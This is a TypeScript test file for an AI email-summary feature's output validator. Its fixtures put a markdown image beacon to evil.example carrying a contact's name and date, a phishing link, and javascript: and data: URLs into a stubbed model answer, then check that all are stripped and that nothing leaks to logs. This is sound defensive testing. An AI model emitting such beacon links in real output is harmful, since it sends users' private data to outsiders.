/**
 * THR-10 AI data exfiltration (SECURITY_AND_PRIVACY_PLAN §2 THR-10, CTL-3.15, R-13; TEST_PLAN
 * TST-EF-10/24/25). A model answer is taken through the shipped Anthropic adapter (stubbed HTTP) and
 * `generateStructured`:
 * - markdown images and links, e-mail addresses and phone numbers that are not in the cited sources
 *   are stripped; references outside the request aliases are dropped; another user's identifier
 *   rejects the whole output;
 * - `ai_requests` telemetry and the logs carry no prompt, source or answer content.
 * Retrieval is user-scoped: the search RPC runs with the caller's JWT and the publishable key (RLS,
 * `search_user_content` is security invoker), never the secret key; service-role reads next to it
 * filter by the verified user. The SQL side is `300_threats_tenant.test.sql`.
 */
import { assert, assertEquals, assertFalse } from '@std/assert';
import { z } from 'zod';
import { type AiRuntime, generateStructured } from '../../_shared/ai/call.ts';
import { validateOutput } from '../../_shared/ai/output-validators.ts';
import { staticPriceSource } from '../../_shared/ai/pricing.ts';
import { cachedPromptSource } from '../../_shared/ai/prompts/registry.ts';
import { createAnthropicProvider } from '../../_shared/ai/providers/anthropic.ts';
import { staticModelConfigSource } from '../../_shared/ai/router.ts';
import { AI_REQUEST_COLUMNS } from '../../_shared/ai/telemetry.ts';
import { wrapAll } from '../../_shared/ai/untrusted.ts';
import { createLogger, memorySink } from '../../_shared/logging/logger.ts';
import {
  allFlags,
  configRow,
  memoryCache,
  PRICES,
  promptVersion,
  recordingBudget,
  recordingTelemetry,
} from '../../_shared/testing/ai.ts';
import { testDb } from '../../_shared/testing/db.ts';
import { TEST_SUPABASE_URL } from '../../_shared/testing/env.ts';
import { jsonResponse, stubFetch } from '../../_shared/testing/fetch.ts';
import { USER_A, USER_B } from '../../_shared/testing/jwt.ts';
import { supabaseIntelApi } from '../../api/routes/intel-api.ts';

const SOURCE =
  'Selin Kaya: İmzalı sözleşmeyi 30 Eylül’e kadar https://portal.musteri.example/sozlesme adresine yükleyin. Sorular için 0532 111 22 33.';
const OTHER_USER_ITEM = '9f8e7d6c-5b4a-4c3d-8e2f-1a0b9c8d7e6f';

const Summary = z.strictObject({
  summary_tr: z.string(),
  refs: z.array(z.string()),
  proposed_actions: z.array(z.strictObject({ kind: z.string() })),
});

function anthropicMessage(data: unknown) {
  return {
    id: 'msg_1',
    type: 'message',
    role: 'assistant',
    model: 'primary-model',
    content: [{ type: 'text', text: JSON.stringify(data) }],
    stop_reason: 'end_turn',
    stop_sequence: null,
    usage: { input_tokens: 900, output_tokens: 120 },
  };
}

function runtimeWith(answer: unknown) {
  const stub = stubFetch(() => jsonResponse(anthropicMessage(answer)));
  const provider = createAnthropicProvider({ apiKey: 'test-anthropic-key', fetch: stub.fetch });
  const telemetry = recordingTelemetry();
  const sink = memorySink();
  const rt: AiRuntime = {
    router: {
      configs: staticModelConfigSource([configRow({ fallback_targets: [] })]),
      providerAvailable: (p) => p === 'anthropic',
    },
    prompts: cachedPromptSource((key) =>
      Promise.resolve(key === 'thread_summary' ? promptVersion() : null),
    ),
    prices: staticPriceSource(PRICES),
    telemetry,
    budget: recordingBudget(),
    cache: memoryCache(),
    provider: (id) => (id === 'anthropic' ? provider : null),
    aiHashPepper: 'p'.repeat(44),
    log: createLogger({ fn: 'worker', sink: sink.sink }),
    random: () => 0,
    sleep: () => Promise.resolve(),
  };
  return { rt, stub, telemetry, logs: sink.lines };
}

function summarize(rt: AiRuntime) {
  const { text } = wrapAll([{ ref: 'm1', kind: 'email', text: SOURCE }]);
  return generateStructured(rt, {
    feature: 'thread_summary',
    userId: USER_A,
    plan: 'pro',
    profile: 'balanced',
    flags: allFlags(),
    schema: Summary,
    schemaName: 'ThreadSummaryV1',
    buildPrompt: (v) => ({ system: v.system_prompt, untrusted: text, instruction: 'Özetle.' }),
    sources: [SOURCE],
    aliases: new Set(['m1']),
    units: 1,
    correlationId: '7b0c8f0e-3a1d-4d2e-9f5b-0c1d2e3f4a5b',
  });
}

Deno.test(
  'THR-10: exfiltration links, images, contacts and foreign refs in a model answer are stripped; nothing leaks to telemetry or logs',
  async () => {
    const { rt, stub, telemetry, logs } = runtimeWith({
      summary_tr:
        'Sözleşme 30 Eylül’e kadar https://portal.musteri.example/sozlesme adresine yüklenmeli. ' +
        '![x](https://evil.example/c?d=Selin%20Kaya%2030%20Eyl%C3%BCl) ' +
        '[Tıkla](https://evil.example/phish) destek@evil.example 0555 999 88 77 ' +
        'Ara: 0532 111 22 33.',
      refs: ['m1', 'm9'],
      proposed_actions: [],
    });
    const result = await summarize(rt);
    assert(result.kind === 'ai');
    const text = result.data.summary_tr;
    assert(text.includes('https://portal.musteri.example/sozlesme'), 'a cited source URL stays');
    assert(text.includes('0532 111 22 33'), 'a cited phone number stays');
    assertFalse(text.includes('evil.example'), text);
    assertFalse(text.includes('0555 999 88 77'));
    assertFalse(/!\[|\]\(/.test(text), 'no markdown image or link survives');
    assertEquals(result.data.refs, ['m1']);
    assertEquals(stub.calls.length, 1);

    const allowed = new Set<string>(AI_REQUEST_COLUMNS);
    assert(telemetry.rows.length > 0);
    for (const row of telemetry.rows) {
      for (const key of Object.keys(row))
        assert(allowed.has(key), `unexpected telemetry column ${key}`);
      const serialized = JSON.stringify(row);
      for (const fragment of ['Selin', 'Sözleşme', 'sozlesme', 'evil.example', '0532']) {
        assertFalse(serialized.includes(fragment), `telemetry carries ${fragment}`);
      }
    }
    const logged = logs.join('\n');
    for (const fragment of ['Selin', 'Sözleşme', 'evil.example', '0532', 'untrusted_content']) {
      assertFalse(logged.includes(fragment), `logs carry ${fragment}`);
    }
  },
);

Deno.test('THR-10: another user’s identifier in the output rejects it (cross-user guard)', () => {
  const leak = validateOutput(
    Summary,
    { summary_tr: `Bkz. kayıt ${OTHER_USER_ITEM}`, refs: ['m1'], proposed_actions: [] },
    { sources: [SOURCE], aliases: new Set(['m1']) },
  );
  assertEquals(leak.ok ? null : leak.reason, 'identifier_leak');
  const url = validateOutput(
    Summary,
    {
      summary_tr: 'javascript:alert(1) data:text/html,x ftp://evil.example/x',
      refs: [],
      proposed_actions: [],
    },
    { sources: [SOURCE], aliases: new Set(['m1']) },
  );
  assert(url.ok);
  assertFalse(/javascript:|data:|ftp:/.test(url.data.summary_tr));
});

Deno.test(
  'THR-10 / R-13: retrieval runs with the caller’s JWT under RLS; service-role reads beside it are pinned to the caller',
  async () => {
    const stub = stubFetch((call) => {
      const url = new URL(call.url);
      if (url.pathname.startsWith('/rest/v1/rpc/')) return jsonResponse([]);
      const accept = call.headers.get('accept') ?? '';
      return accept.includes('vnd.pgrst.object')
        ? jsonResponse({ code: 'PGRST116', message: 'no rows', details: null }, 406)
        : jsonResponse([]);
    });
    const secretKey = 'sb_secret_service-role-key-for-tests';
    const api = supabaseIntelApi({
      system: testDb(stub.fetch, secretKey),
      config: {
        url: TEST_SUPABASE_URL,
        publishableKey: 'sb_publishable_testkey',
        secretKey,
        fetch: stub.fetch,
      },
      ai: {} as never,
      mail: {} as never,
      memory: {} as never,
      bodies: null,
    });
    const jwtA = 'eyJ.user-a.jwt';
    const auth = { userId: USER_A, jwt: jwtA, aal: 'aal1', sessionId: null, claims: {} } as never;
    const repo = api.search(auth);
    await repo.search({
      p_query: 'sözleşme',
      p_query_embedding: null,
      p_types: null,
      p_from: null,
      p_to: null,
      p_contact_id: null,
      p_cursor: null,
      p_limit: 20,
    });
    await repo.ownsContact(OTHER_USER_ITEM);
    await repo.contactsNamed(['Selin']);
    await repo.semanticQuota();
    await api.briefings(auth).byId(OTHER_USER_ITEM);

    const searchCall = stub.calls.find((c) => c.url.endsWith('/rpc/search_user_content'));
    assert(searchCall !== undefined, 'the search RPC was called');
    assertEquals(searchCall.headers.get('Authorization'), `Bearer ${jwtA}`);
    assertEquals(searchCall.headers.get('apikey'), 'sb_publishable_testkey');
    assertFalse(JSON.stringify(JSON.parse(searchCall.body ?? '{}')).includes('user_id'));
    for (const call of stub.calls) {
      const usesSecret = call.headers.get('apikey') === secretKey;
      const url = decodeURIComponent(call.url);
      if (!usesSecret) {
        assertEquals(call.headers.get('Authorization'), `Bearer ${jwtA}`, url);
        continue;
      }
      // Every service-role request names the caller and nobody else.
      const scoped = url.includes(`user_id=eq.${USER_A}`) || (call.body ?? '').includes(USER_A);
      assert(scoped, `unscoped service-role request: ${url}`);
      assertFalse(url.includes(USER_B) || (call.body ?? '').includes(USER_B));
    }
  },
);
